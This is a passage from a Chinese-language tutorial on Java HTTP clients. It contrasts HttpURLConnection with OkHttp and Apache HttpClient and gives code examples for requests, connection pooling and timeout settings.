<li><strong>高并发瓶颈</strong>：在需要高并发请求的场景下，每次请求都可能需要创建新的物理连接，导致：<ul>
<li><strong>高延迟</strong>：每个请求都包含连接建立的耗时。</li>
<li><strong>高CPU消耗</strong>：频繁的握手过程会消耗大量的客户端与服务器CPU资源。</li>
<li><strong>端口耗尽</strong>：短时间内创建大量短连接，可能导致客户端的可用端口（TIME_WAIT状态）被耗尽。</li>
</ul>
</li>
</ul>
<p>专业的HTTP客户端将连接池作为核心功能，提供了强大的配置和管理能力，这是其性能远超<code>HttpURLConnection</code>的关键所在。</p>
<hr>
<h3 id="1-3-资源管理复杂，容易导致泄漏"><a href="#1-3-资源管理复杂，容易导致泄漏" class="headerlink" title="1.3 资源管理复杂，容易导致泄漏"></a>1.3 资源管理复杂，容易导致泄漏</h3><p>由于API的低阶性，<code>HttpURLConnection</code> 将资源管理的责任完全交给了开发者，这极易因疏忽而导致资源泄漏。</p>
<ul>
<li><strong>流未关闭</strong>：最常见的泄漏是忘记关闭<code>InputStream</code>或<code>OutputStream</code>。即使使用了<code>try-with-resources</code>，也需要确保所有可能的流都被正确处理。</li>
<li><strong>连接未释放</strong>：如果响应体<code>InputStream</code>没有被完全读取并关闭，底层的连接可能不会被JVM的Keep-Alive机制回收，而是被一直占用，直到超时。当这类问题在高并发下发生时，会迅速耗尽所有可用连接，导致后续请求全部阻塞或失败。</li>
<li><strong><code>disconnect()</code>的调用时机</strong>：必须在<code>finally</code>块中调用<code>connection.disconnect()</code>来确保无论请求成功与否，连接相关的资源都能被最终释放。忘记这一点就会导致确定的资源泄漏。</li>
</ul>
<p><strong>正确的资源管理模式非常繁琐，正如 <code>1.1</code> 的代码示例所示，需要严格的 <code>try-catch-finally</code> 结构和对输入&#x2F;输出流的细致处理。</strong></p>
<p>现代HTTP客户端通过更高层次的抽象解决了这个问题。例如，当使用OkHttp的<code>response.body().string()</code>时，库内部已经处理了流的读取和关闭，我们只需要在最外层对<code>Response</code>对象使用<code>try-with-resources</code>即可，极大地降低了资源泄漏的风险。</p>
<hr>
<h2 id="2-现代HTTP客户端的核心能力"><a href="#2-现代HTTP客户端的核心能力" class="headerlink" title="2. 现代HTTP客户端的核心能力"></a>2. 现代HTTP客户端的核心能力</h2><p>为了克服 <code>HttpURLConnection</code> 的种种局限性，社区和框架涌现出了一批优秀的HTTP客户端库。它们之所以成为现代Java开发的事实标准，是因为它们普遍具备以下五大核心能力：</p>
<h3 id="2-1-简洁流畅的API（Fluent-API）"><a href="#2-1-简洁流畅的API（Fluent-API）" class="headerlink" title="2.1 简洁流畅的API（Fluent API）"></a>2.1 简洁流畅的API（Fluent API）</h3><p>现代客户端普遍采用<strong>构建者模式（Builder Pattern）和 流式API（Fluent API）</strong>，使得创建和配置请求的过程像书写一段自然语言一样，极大提升了代码的可读性和可维护性。</p>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>可读性强</strong>：方法链式调用（e.g., <code>request.url(...).header(...).post(...)</code>）清晰地描述了请求的构造过程。</li>
<li><strong>不易出错</strong>：通过构建者模式，将一个复杂对象的构建过程分步进行，并在最后通过 <code>.build()</code> 方法生成一个**不可变（Immutable）**的请求对象。这保证了对象一旦创建就不会被意外修改，是线程安全的。</li>
<li><strong>易于发现</strong>：IDE的自动补全功能可以轻松引导开发者发现所有可用的配置选项。</li>
</ul>
<p><strong>示例：使用OkHttp发送与 <code>1.1</code> 中相同的POST请求</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建共享的、线程安全的OkHttpClient实例（通常是单例）</span></span><br><span class="line"><span class="type">OkHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OkHttpClient</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 定义请求体</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonBody</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;test\&quot;, \&quot;value\&quot;:1&#125;&quot;</span>;</span><br><span class="line"><span class="type">RequestBody</span> <span class="variable">body</span> <span class="operator">=</span> RequestBody.create(jsonBody, MediaType.get(<span class="string">&quot;application/json; charset=utf-f&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用流式API构建请求</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Request</span>.Builder()</span><br><span class="line">    .url(<span class="string">&quot;https://api.example.com/data&quot;</span>)</span><br><span class="line">    .post(body)</span><br><span class="line">    .addHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 执行请求并处理响应（使用try-with-resources自动关闭资源）</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> client.newCall(request).execute()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!response.isSuccessful()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unexpected code &quot;</span> + response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 简单获取响应体字符串，无需手动处理流</span></span><br><span class="line">    System.out.println(<span class="string">&quot;Response: &quot;</span> + response.body().string());</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，代码量锐减，逻辑清晰，并且资源管理被极大地简化了。</p>
<hr>
<h3 id="2-2-高效的连接池管理"><a href="#2-2-高效的连接池管理" class="headerlink" title="2.2 高效的连接池管理"></a>2.2 高效的连接池管理</h3><p>这是现代HTTP客户端最重要的性能优势。它们内置了功能强大的连接池，自动管理和复用底层的TCP连接。</p>
<p><strong>核心优势：</strong></p>
<ul>
<li><strong>显著降低延迟</strong>：通过复用已建立的连接，避免了为每个请求都进行TCP三次握手和TLS握手的巨大开销。</li>
<li><strong>提升吞吐量</strong>：减少了系统在创建和销毁连接上的CPU和内存消耗，使得服务能够处理更高的并发请求。</li>
<li><strong>高度可配置</strong>：提供了精细化的配置选项，以适应不同的业务场景。<ul>
<li><code>maxIdleConnections</code>: 连接池中允许的最大空闲连接数。</li>
<li><code>keepAliveDuration</code>: 空闲连接在被回收之前可以存活的时间。</li>
<li><code>maxRequests</code> &#x2F; <code>maxRequestsPerHost</code> (OkHttp): 限制并发请求的总数和到单个主机的并发请求数，防止对下游服务造成过大压力。</li>
<li><code>maxTotal</code> &#x2F; <code>maxPerRoute</code> (Apache HttpClient): 类似地，控制总连接数和每个路由（主机+端口）的最大连接数。</li>
</ul>
</li>
</ul>
<p>默认情况下，OkHttp等客户端已开启了优化的连接池，开发者无需配置即可享受其带来的性能提升。</p>
<hr>
<h3 id="2-3-同步与异步编程模型的支持"><a href="#2-3-同步与异步编程模型的支持" class="headerlink" title="2.3 同步与异步编程模型的支持"></a>2.3 同步与异步编程模型的支持</h3><p>现代业务系统，特别是高并发的互联网应用，对非阻塞I&#x2F;O的需求越来越高。现代HTTP客户端为此提供了完善的支持。</p>
<ul>
<li><strong>同步（Blocking）调用</strong>：方法会阻塞当前线程，直到收到HTTP响应。这种方式编码简单，易于理解，适用于简单脚本或后台任务。<ul>
<li><strong>示例 (OkHttp)</strong>: <code>Response response = call.execute();</code></li>
</ul>
</li>
<li><strong>异步（Non-Blocking）调用</strong>：方法会立即返回，不会阻塞当前线程。请求在后台线程池中执行，当响应到达时，通过回调函数或<code>CompletableFuture</code>等机制通知调用方。这是构建高伸缩性、高吞吐量服务的关键。<ul>
<li><strong>示例 (OkHttp)</strong>: <code>call.enqueue(new Callback() { ... });</code></li>
<li><strong>示例 (JDK 11 HttpClient)</strong>: <code>client.sendAsync(request, ...).thenAccept(response -&gt; ...);</code></li>
<li><strong>示例 (Spring WebClient)</strong>: <code>webClient.get().retrieve().bodyToMono(String.class);</code> (天生异步)</li>
</ul>
</li>
</ul>
<p>通过支持异步模型，可以将Web服务器的I&#x2F;O线程（如Tomcat线程）从漫长的等待中解放出来，去处理更多的用户请求，从而提升整个应用的吞吐能力。</p>
<hr>
<h3 id="2-4-请求-响应拦截与扩展机制"><a href="#2-4-请求-响应拦截与扩展机制" class="headerlink" title="2.4 请求&#x2F;响应拦截与扩展机制"></a>2.4 请求&#x2F;响应拦截与扩展机制</h3><p>拦截器（Interceptor）是一种强大的机制，它允许开发者在不修改核心业务代码的情况下，对HTTP请求和响应进行统一处理。这是一种典型的**面向切面编程（AOP）**思想的应用。</p>
<p><strong>常见应用场景：</strong></p>
<ul>
<li><strong>统一日志记录</strong>：记录所有出站请求的URL、请求头、请求体以及响应状态和耗时。</li>
<li><strong>通用Header添加</strong>：为所有请求自动添加认证令牌（如 <code>Authorization: Bearer ...</code>）、<code>User-Agent</code>、追踪ID等。</li>
<li><strong>请求签名&#x2F;加密</strong>：在请求发送前，根据特定规则计算签名或对内容进行加密。</li>
<li><strong>响应解密&#x2F;验签</strong>：在收到响应后，进行解密或验证签名。</li>
<li><strong>自动重试</strong>：当遇到网络抖动或服务端临时错误（如503）时，自动进行重试。</li>
<li><strong>监控度量</strong>：收集请求的成功率、延迟等指标，并上报给监控系统（如Prometheus）。</li>
<li><strong>缓存控制</strong>：实现自定义的HTTP缓存逻辑。</li>
</ul>
<p>拦截器提供了一个标准的、可组合的扩展点，使得这些横切关注点能够被优雅地模块化，避免了在每个业务调用点重复编写样板代码。</p>
<hr>
<h3 id="2-5-对-HTTP-2、WebSocket-等现代协议的支持"><a href="#2-5-对-HTTP-2、WebSocket-等现代协议的支持" class="headerlink" title="2.5 对 HTTP&#x2F;2、WebSocket 等现代协议的支持"></a>2.5 对 HTTP&#x2F;2、WebSocket 等现代协议的支持</h3><p>Web协议在不断发展，现代客户端能够与时俱进，让开发者轻松利用新协议带来的优势。</p>
<ul>
<li><strong>HTTP&#x2F;2</strong>：<ul>
<li><strong>核心特性</strong>：<strong>多路复用（Multiplexing）</strong>，允许在单个TCP连接上并行发送和接收多个请求&#x2F;响应，彻底解决了HTTP&#x2F;1.1的队头阻塞问题。</li>
<li><strong>优势</strong>：在微服务架构中，一个服务可能需要调用多个下游服务，HTTP&#x2F;2能显著降低连接开销和延迟。</li>
<li><strong>支持方式</strong>：OkHttp、JDK 11 HttpClient等客户端默认支持HTTP&#x2F;2。它们通过**ALPN（应用层协议协商）**在TLS握手阶段与服务器协商，如果服务器支持，则**自动、透明地升级**到HTTP&#x2F;2，开发者无需任何额外代码。</li>
</ul>
</li>
<li><strong>WebSocket</strong>：<ul>
<li><strong>核心特性</strong>：提供一个基于TCP的<strong>全双工通信</strong>信道，允许客户端和服务器之间进行实时的、双向的数据交换。</li>
<li><strong>优势</strong>：适用于实时聊天、在线游戏、金融行情推送、实时监控仪表盘等场景。</li>
<li><strong>支持方式</strong>：现代客户端提供了专门的API来发起WebSocket握手并管理连接生命周期，开发者只需实现监听器接口来处理连接的打开、收到消息、关闭和错误等事件。</li>
</ul>
</li>
</ul>
<hr>
<h1 id="二、Apache-HttpClient"><a href="#二、Apache-HttpClient" class="headerlink" title="二、Apache HttpClient"></a>二、Apache HttpClient</h1><p>Apache HttpClient 是一个历史悠久、功能极其强大且高度可配置的HTTP客户端库。它在Java生态中被广泛应用，尤其是在需要处理复杂HTTP场景（如精细的连接管理、复杂的认证机制）的企业级应用和遗留系统中。</p>
<h2 id="1-核心概念与组件"><a href="#1-核心概念与组件" class="headerlink" title="1. 核心概念与组件"></a>1. 核心概念与组件</h2><h3 id="1-1-HttpClient-客户端实例"><a href="#1-1-HttpClient-客户端实例" class="headerlink" title="1.1 HttpClient: 客户端实例"></a>1.1 <code>HttpClient</code>: 客户端实例</h3><p><code>HttpClient</code> 接口（及其常用实现类如 <code>CloseableHttpClient</code>）是执行HTTP请求的<strong>主入口</strong>。你可以把它想象成一个已经配置好的“浏览器”实例，它包含了执行请求所需的所有上下文信息。</p>
<ul>
<li><strong>职责</strong>:<ul>
<li>执行 <code>HttpRequest</code>，并返回一个 <code>HttpResponse</code>。</li>
<li>管理底层的连接、Cookie、认证和重定向等策略。</li>
</ul>
</li>
<li><strong>核心特性</strong>:<ul>
<li><strong>线程安全</strong>: <code>HttpClient</code> 的实例被设计为线程安全的。这意味着你可以在整个应用程序中创建一个<strong>单例</strong>的<code>HttpClient</code>实例，并在多个线程之间安全地共享它来并发执行HTTP请求。</li>
<li><strong>重量级对象</strong>: 创建一个<code>HttpClient</code>实例是一个相对昂贵的操作，因为它需要初始化连接池、SSL上下文等资源。因此，<strong>严禁</strong>为每个请求都创建一个新的<code>HttpClient</code>实例，这会导致严重的性能问题。正确的做法是复用一个全局的实例。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-2-HttpRequest-HttpResponse-请求与响应抽象"><a href="#1-2-HttpRequest-HttpResponse-请求与响应抽象" class="headerlink" title="1.2 HttpRequest &#x2F; HttpResponse: 请求与响应抽象"></a>1.2 <code>HttpRequest</code> &#x2F; <code>HttpResponse</code>: 请求与响应抽象</h3><p>这两个接口是HTTP协议中请求和响应消息的Java对象模型。</p>
<ul>
<li><strong><code>HttpRequest</code></strong>: 代表一个客户端发出的HTTP请求。<ul>
<li><strong>组成</strong>:<ul>
<li><strong>请求行 (Request Line)</strong>: 包括请求方法（GET, POST等）和请求URI。</li>
<li><strong>请求头 (Headers)</strong>: 如 <code>Content-Type</code>, <code>Accept</code>, <code>Authorization</code> 等。</li>
<li><strong>请求体 (Entity)</strong>: 通过 <code>HttpEntity</code> 接口表示，用于POST&#x2F;PUT等请求。HttpClient提供了多种<code>HttpEntity</code>实现，如 <code>StringEntity</code> (字符串), <code>UrlEncodedFormEntity</code> (表单), <code>FileEntity</code> (文件)等。</li>
</ul>
</li>
<li><strong>常用实现类</strong>: 为了方便，HttpClient直接提供了 <code>HttpGet</code>, <code>HttpPost</code>, <code>HttpPut</code> 等具体类，简化了请求对象的创建。</li>
</ul>
</li>
<li><strong><code>HttpResponse</code></strong>: 代表服务器返回的HTTP响应。<ul>
<li><strong>组成</strong>:<ul>
<li><strong>状态行 (Status Line)</strong>: 包括协议版本、状态码（如 <code>200</code>）和原因短语（如 <code>OK</code>）。</li>
<li><strong>响应头 (Headers)</strong>: 如 <code>Content-Type</code>, <code>Content-Length</code>, <code>Set-Cookie</code> 等。</li>
<li><strong>响应体 (Entity)</strong>: 同样由 <code>HttpEntity</code> 表示。<strong>极其重要的一点是</strong>：必须完全消费（读取）或显式关闭响应体的 <code>InputStream</code> (<code>HttpEntity.getContent().close()</code>)，才能将底层的HTTP连接安全地释放回连接池。否则将导致连接泄漏。</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="1-3-HttpClientBuilder-客户端构建器"><a href="#1-3-HttpClientBuilder-客户端构建器" class="headerlink" title="1.3 HttpClientBuilder: 客户端构建器"></a>1.3 <code>HttpClientBuilder</code>: 客户端构建器</h3><p>由于 <code>HttpClient</code> 是一个配置复杂的对象，直接实例化它非常不便。HttpClient 4.3版本后引入了<strong>构建者模式（Builder Pattern）</strong>，<code>HttpClientBuilder</code> 是创建 <code>HttpClient</code> 实例的推荐方式。</p>
<ul>
<li><strong>职责</strong>: 提供一个流畅（Fluent）的API来组装和配置一个 <code>HttpClient</code> 实例。</li>
<li><strong>核心配置方法</strong>:<ul>
<li><code>.setConnectionManager(...)</code>: <strong>设置连接管理器</strong>，这是最重要的配置之一，用于指定使用的连接池。</li>
<li><code>.setDefaultRequestConfig(...)</code>: 设置默认的请求配置，如连接超时、Socket超时等。</li>
<li><code>.setRetryHandler(...)</code>: 设置请求失败时的重试策略。</li>
<li><code>.setSSLContext(...)</code>: 配置HTTPS的SSL上下文，用于处理自定义证书等场景。</li>
<li><code>.addInterceptorLast(...)</code>&#x2F;<code>.addInterceptorFirst(...)</code>: 添加请求&#x2F;响应拦截器。</li>
</ul>
</li>
<li><strong>构建</strong>: 配置完成后，调用 <code>.build()</code> 方法即可生成一个 <code>CloseableHttpClient</code> 实例。这种方式使得客户端的配置代码非常清晰且易于管理。</li>
</ul>
<hr>
<h3 id="1-4-PoolingHttpClientConnectionManager-连接池管理器"><a href="#1-4-PoolingHttpClientConnectionManager-连接池管理器" class="headerlink" title="1.4 PoolingHttpClientConnectionManager: 连接池管理器"></a>1.4 <code>PoolingHttpClientConnectionManager</code>: 连接池管理器</h3><p>这是实现HttpClient高性能的<strong>核心组件</strong>。它负责创建、管理和分发HTTP连接。</p>
<ul>
<li><strong>职责</strong>: 维护一个HTTP连接池，以复用TCP连接，避免为每个请求都进行昂贵的TCP和TLS握手。</li>
<li><strong>核心配置参数</strong>:<ul>
<li><code>setMaxTotal(int max)</code>: 设置连接池允许管理的最大连接总数。这是对整个客户端实例的并发硬限制。</li>
<li><code>setDefaultMaxPerRoute(int max)</code>: 设置每个“路由”（Route，可以简单理解为目标主机+端口）默认的并发连接数。这个参数至关重要，它可以防止你的应用因为对某一个目标服务的请求量过大，而耗尽整个连接池的资源，影响到对其他服务的调用。</li>
<li><code>setMaxPerRoute(HttpRoute route, int max)</code>: 为特定的路由设置最大并发连接数，覆盖默认值。</li>
</ul>
</li>
<li><strong>工作流程</strong>:<ol>
<li>当 <code>HttpClient</code> 执行一个请求时，它会向 <code>PoolingHttpClientConnectionManager</code> 请求一个到目标路由的连接。</li>
<li>连接池检查是否有可用的空闲连接。如果有，则直接返回；如果没有，且当前连接数未达到上限，则创建一个新连接。</li>
<li>请求完成后（响应体被完全消费或关闭），连接被释放（release）回连接池，等待下一次复用，而不是直接关闭物理连接。</li>
</ol>
</li>
</ul>
<hr>
<h2 id="2-核心功能与代码实践"><a href="#2-核心功能与代码实践" class="headerlink" title="2. 核心功能与代码实践"></a>2. 核心功能与代码实践</h2><h3 id="2-1-基本用法"><a href="#2-1-基本用法" class="headerlink" title="2.1 基本用法"></a>2.1 基本用法</h3><p>这是最基础的操作，展示了HttpClient的请求-执行-响应流程。</p>
<h4 id="2-1-1-前置代码：创建HttpClient实例"><a href="#2-1-1-前置代码：创建HttpClient实例" class="headerlink" title="2.1.1 前置代码：创建HttpClient实例"></a>2.1.1 前置代码：创建HttpClient实例</h4><p>在所有示例前，我们先创建一个可复用的<code>HttpClient</code>实例。实际项目中，这个<code>client</code>实例应该是单例的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通常在Spring中配置为Bean，或作为静态单例</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-2-发送GET请求"><a href="#2-1-2-发送GET请求" class="headerlink" title="2.1.2 发送GET请求"></a>2.1.2 发送GET请求</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(<span class="string">&quot;https://api.github.com/users/apache&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Executing request: &quot;</span> + httpGet.getURI());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 try-with-resources 确保响应被关闭，连接被释放回池中</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(httpGet)) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;----------------------------------------&quot;</span>);</span><br><span class="line">    System.out.println(response.getStatusLine()); <span class="comment">// 打印状态行: HTTP/1.1 200 OK</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取响应实体</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">responseBody</span> <span class="operator">=</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">    System.out.println(<span class="string">&quot;Response Body: &quot;</span> + responseBody.substring(<span class="number">0</span>, <span class="number">100</span>) + <span class="string">&quot;...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// EntityUtils.toString() 会自动关闭实体内容的流，但推荐使用 try-with-resources 管理 response</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-3-发送POST请求-application-x-www-form-urlencoded"><a href="#2-1-3-发送POST请求-application-x-www-form-urlencoded" class="headerlink" title="2.1.3 发送POST请求 (application&#x2F;x-www-form-urlencoded)"></a>2.1.3 发送POST请求 (application&#x2F;x-www-form-urlencoded)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpPost</span> <span class="variable">httpPostForm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;https://httpbin.org/post&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建表单参数</span></span><br><span class="line">List&lt;NameValuePair&gt; formParams = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">formParams.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>));</span><br><span class="line">formParams.add(<span class="keyword">new</span> <span class="title class_">BasicNameValuePair</span>(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;secret&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将参数列表封装到UrlEncodedFormEntity，并设置编码</span></span><br><span class="line">httpPostForm.setEntity(<span class="keyword">new</span> <span class="title class_">UrlEncodedFormEntity</span>(formParams, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(httpPostForm)) &#123;</span><br><span class="line">    System.out.println(response.getStatusLine());</span><br><span class="line">    System.out.println(EntityUtils.toString(response.getEntity()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-1-4-发送POST请求-application-json"><a href="#2-1-4-发送POST请求-application-json" class="headerlink" title="2.1.4 发送POST请求 (application&#x2F;json)"></a>2.1.4 发送POST请求 (application&#x2F;json)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpPost</span> <span class="variable">httpPostJson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(<span class="string">&quot;https://httpbin.org/post&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;John Doe\&quot;,\&quot;role\&quot;:\&quot;developer\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将JSON字符串封装到StringEntity</span></span><br><span class="line"><span class="type">StringEntity</span> <span class="variable">jsonEntity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(json, ContentType.APPLICATION_JSON);</span><br><span class="line">httpPostJson.setEntity(jsonEntity);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.execute(httpPostJson)) &#123;</span><br><span class="line">    System.out.println(response.getStatusLine());</span><br><span class="line">    System.out.println(EntityUtils.toString(response.getEntity()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-连接池配置"><a href="#2-2-连接池配置" class="headerlink" title="2.2 连接池配置"></a>2.2 连接池配置</h3><p>这是提升HttpClient性能的关键。通过<code>PoolingHttpClientConnectionManager</code>进行配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建连接池管理器</span></span><br><span class="line"><span class="type">PoolingHttpClientConnectionManager</span> <span class="variable">connManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolingHttpClientConnectionManager</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 设置连接池最大连接数</span></span><br><span class="line">connManager.setMaxTotal(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 设置每个路由（目标主机）的最大并发连接数</span></span><br><span class="line"><span class="comment">// 这个参数非常重要，可以防止对单个主机的请求过多而耗尽整个池</span></span><br><span class="line">connManager.setDefaultMaxPerRoute(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// (可选) 为特定路由设置更高的并发数</span></span><br><span class="line"><span class="comment">// HttpHost targetHost = new HttpHost(&quot;api.some-service.com&quot;, 80);</span></span><br><span class="line"><span class="comment">// connManager.setMaxPerRoute(new HttpRoute(targetHost), 50);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 使用配置了连接池的HttpClientBuilder来构建HttpClient</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">pooledClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setConnectionManager(connManager)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后续使用 pooledClient 发送请求即可享受连接池带来的性能提升</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-3-超时配置"><a href="#2-3-超时配置" class="headerlink" title="2.3 超时配置"></a>2.3 超时配置</h3><p>通过<code>RequestConfig</code>来为请求设置超时，防止线程因网络问题被长时间阻塞。</p>
<ul>
<li><strong><code>setConnectTimeout(int)</code></strong>: 连接超时。客户端发起请求，与目标服务器建立TCP连接的超时时间。</li>
<li><strong><code>setSocketTimeout(int)</code></strong>: Socket超时&#x2F;读取超时。连接建立后，从服务器读取数据的超时时间（两次数据包之间的最大间隔）。</li>
<li><strong><code>setConnectionRequestTimeout(int)</code></strong>: 连接请求超时。从连接池获取可用连接的超时时间。如果连接池已满，此设置可防止线程无限期等待。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建默认的RequestConfig</span></span><br><span class="line"><span class="type">RequestConfig</span> <span class="variable">requestConfig</span> <span class="operator">=</span> RequestConfig.custom()</span><br><span class="line">        .setConnectTimeout(<span class="number">5000</span>) <span class="comment">// 5秒连接超时</span></span><br><span class="line">        .setSocketTimeout(<span class="number">10000</span>) <span class="comment">// 10秒读取超时</span></span><br><span class="line">        .setConnectionRequestTimeout(<span class="number">1000</span>) <span class="comment">// 1秒从连接池获取连接超时</span></span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将默认配置应用到HttpClient</span></span><br><span class="line"><span class="type">CloseableHttpClient</span> <span class="variable">timeoutClient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">        .setDefaultRequestConfig(requestConfig)</span><br><span class="line">        <span class="comment">// 也可以同时配置连接池</span></span><br><span class="line">        .setConnectionManager(connManager) </span><br><span class="line">        .build();</span><br><span 